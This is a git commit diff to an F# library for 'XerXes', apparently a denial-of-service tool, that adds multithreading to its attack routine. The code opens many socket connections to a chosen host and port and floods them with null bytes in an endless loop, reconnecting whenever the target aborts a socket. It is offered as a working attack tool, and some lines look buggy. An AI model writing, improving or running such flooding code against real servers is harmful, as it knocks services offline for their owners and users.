f34da5334cb9b06d2eb5e1d49842c2b2043994d9
Kied T L <eli.georgios@gmail.com>
2019-02-20 07:14:45 -0500

    Add threading to XerXes

--- lib/xerxeslib.fs
+++ lib/xerxeslib.fs
@@ -17,29 +17,48 @@ open System.Collections.Generic
 module xerxeslib =
     let nil : string = string (char 0x00)
 
-    let rec sendnul (host : string) (port : int) (sockets : List<Socket>) (index : int) (number : int)  =
+    let rec sendnul (host : string) (port : int) (sockets : List<Socket>) (index : int) (number : int) =
         let request : byte array = Encoding.ASCII.GetBytes (nil)
         let socket = sockets.[index]
-        let newIndex = 0
-        let r = socket.Send(request)
+        let mutable newIndex = 0
+        let mutable r = 0
+
+        // The party starts right here
+        try
+            r <- socket.Send(request)
+            None
+        with
+            | :? System.Net.Sockets.SocketException as err ->
+                error ("The established socket [" + index.ToString() + "] was aborted by the host machine's software.")
+                socket.Close()
+                socket = socketutil.connect(host, port)
+                None
+
         if r = -1 then
             socket.Close()
             socket = socketutil.connect(host, port)
-            else
-                socket.Dispose
-                false
-        verbose ("volley [" + (number.ToString()) + "] fired\n")
-        if (index + 1) > sockets.Count then
-            newIndex = 0
-            else
-                newIndex = (index + 1)
-                false
+            else false
+        verbose ("volley [" + (Thread.CurrentThread.ManagedThreadId).ToString() + ">" + (number.ToString()) + "] sent")
+        if (index + 1) >= sockets.Count then
+            newIndex <- 0
+            else newIndex <- (index + 1)
+
         sendnul host port sockets newIndex (number + 1)
 
-    let attack (host : string) (port : int) (id : int) (connections : int) =
+    let startattackthread (host : string) (port : int) (sockets : List<Socket>) (threadno : int) =
+        let param = struct(host, port, sockets, 0, 1)
+        let cts = new ThreadStart((fun () -> sendnul host port sockets 0 1))
+        let childthread : Thread = new Thread(cts)
+        childthread.Start()
+        success ("initialized thread " + threadno.ToString() + " -> " + (Thread.CurrentThread.ManagedThreadId).ToString())
+
+    let attack (host : string) (port : int) (id : int) (connections : int) (threads : int) =
         let sockets : List<Socket>= new List<Socket>()
         for i = 0 to connections do
             sockets.Add(socketutil.connect(host, port))
         let g : int = 1
         let r : int = 0
-        sendnul host port sockets 0 1
+        for x = 0 to threads do
+            startattackthread host port sockets x
+            Thread.Sleep(15000)
+
